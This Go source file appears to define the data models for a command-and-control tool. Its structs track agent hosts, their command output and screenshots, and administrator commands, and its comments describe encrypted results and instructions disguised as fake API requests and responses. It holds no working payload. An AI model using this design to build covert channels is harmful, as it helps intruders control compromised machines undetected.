package models

// AgentInfo 内存中的主机状态信息
type AgentInfo struct {
	ID         string `json:"id"`
	IP         string `json:"ip"`
	Hostname   string `json:"hostname"`
	LastSeen   int64  `json:"last_seen"`
	Status     string `json:"status"`      // active / offline
	LastResult string `json:"last_result"` // 命令回显或截图数据
}

// FakeAPIRequest Agent 发送给 Server 的请求
type FakeAPIRequest struct {
	Hostname string `json:"hostname"`
	Token    string `json:"token"` // 加密的回显数据
	Status   string `json:"status"`
}

// FakeAPIResponse Server 发送给 Agent 的响应
type FakeAPIResponse struct {
	Code int    `json:"code"`
	Data string `json:"data"` // 加密的指令
}

// CommandRequest 管理员下发命令的请求
type CommandRequest struct {
	ID  string `json:"id"`
	Cmd string `json:"cmd"`
}
